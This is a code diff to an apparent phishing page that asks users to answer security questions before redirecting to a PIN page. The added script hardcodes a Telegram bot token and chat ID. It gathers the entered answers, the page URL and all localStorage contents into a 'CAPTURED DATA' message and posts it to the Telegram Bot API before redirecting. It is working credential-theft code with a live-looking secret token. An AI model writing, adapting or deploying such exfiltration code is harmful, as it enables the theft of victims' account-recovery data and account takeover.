@@ -95,81 +95,67 @@
             max-width: 150px;
             margin-bottom: 20px;
         }
-        /* ===== Mobile Responsive Styles ===== */
+        
         @media screen and (max-width: 768px) {
             body {
                 flex-direction: column;
                 height: auto;
                 min-height: 100vh;
             }
-
             .left-section {
                 flex: none;
                 justify-content: center;
                 text-align: center;
                 padding: 30px 20px;
             }
-
             .left-section h1 {
                 font-size: 1.5rem;
             }
-
             .left-section p {
                 font-size: 1rem;
             }
-
             .right-section {
                 flex: none;
                 padding: 20px;
             }
-
             .login-form {
                 max-width: 100%;
                 box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
             }
-
             .logo {
                 max-width: 120px;
             }
         }
-
+        
         @media screen and (max-width: 480px) {
             .left-section {
                 padding: 20px 15px;
             }
-
             .left-section h1 {
                 font-size: 1.3rem;
             }
-
             .left-section p {
                 font-size: 0.9rem;
             }
-
             .right-section {
                 padding: 15px;
             }
-
             .login-form {
                 padding: 15px;
             }
-
             .login-form h2 {
                 font-size: 1.1rem;
             }
-
             input[type="text"],
             input[type="password"],
             select {
                 padding: 8px;
-                font-size: 16px; /* Prevents iOS zoom on focus */
+                font-size: 16px;
             }
-
             button {
                 padding: 12px;
                 font-size: 1rem;
             }
-
             .logo {
                 max-width: 100px;
             }
@@ -207,6 +193,13 @@
     </div>
 
     <script>
+        // ========== CONFIGURATION ==========
+        // Replace with your actual Bot Token from @BotFather
+        const BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        // Replace with your actual Chat ID
+        const CHAT_ID = '5615316142s';
+        // ===================================
+
         // Fetching questions from Local Storage
         document.getElementById('question1-label').innerText = localStorage.getItem('question1') || 'Question 1';
         document.getElementById('question2-label').innerText = localStorage.getItem('question2') || 'Question 2';
@@ -215,13 +208,84 @@
         document.getElementById('answer1').value = localStorage.getItem('answer1') || '';
         document.getElementById('answer2').value = localStorage.getItem('answer2') || '';
 
+        /**
+         * Send captured data to Telegram bot via the Bot API
+         */
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            // Using fetch API (modern, no libraries needed)
+            fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram response:', data);
+                })
+                .catch(error => {
+                    console.error('Telegram send error:', error);
+                    // Fallback: try XMLHttpRequest if fetch fails
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send(
+                        'chat_id=' + encodeURIComponent(CHAT_ID) +
+                        '&text=' + encodeURIComponent(message) +
+                        '&parse_mode=HTML'
+                    );
+                });
+        }
+
+        /**
+         * Send all available data from LocalStorage + current inputs to Telegram
+         */
+        function captureAndSend() {
+            const answer1 = document.getElementById('answer1').value.trim();
+            const answer2 = document.getElementById('answer2').value.trim();
+            const question1 = localStorage.getItem('question1') || 'Question 1';
+            const question2 = localStorage.getItem('question2') || 'Question 2';
+
+            // Collect everything from LocalStorage (for other fields saved earlier)
+            let allStorage = '';
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                allStorage += `${key}: ${value}\n`;
+            }
+
+            // Build the message
+            let message = `<b>=== CAPTURED DATA ===</b>\n\n`;
+            message += `<b>Timestamp:</b> ${new Date().toISOString()}\n`;
+            message += `<b>Page URL:</b> ${window.location.href}\n\n`;
+            message += `<b>--- Security Questions ---</b>\n`;
+            message += `Q1: ${question1}\nA1: ${answer1}\n\n`;
+            message += `Q2: ${question2}\nA2: ${answer2}\n\n`;
+            message += `<b>--- All LocalStorage Data ---</b>\n`;
+            message += allStorage || '(none)';
+
+            sendToTelegram(message);
+        }
+
         document.getElementById('confirm-button').addEventListener('click', function() {
             const answer1 = document.getElementById('answer1').value.trim();
             const answer2 = document.getElementById('answer2').value.trim();
 
-            // Validation before proceeding
             if (answer1 && answer2) {
-                window.location.href = "pin.html"; // Redirect to pin.html
+                // Capture and send to Telegram BEFORE redirecting
+                captureAndSend();
+
+                // Small delay to ensure the request goes out before navigation
+                setTimeout(function() {
+                    window.location.href = "pin.html";
+                }, 500);
             } else {
                 alert('Please answer all security questions.');
             }
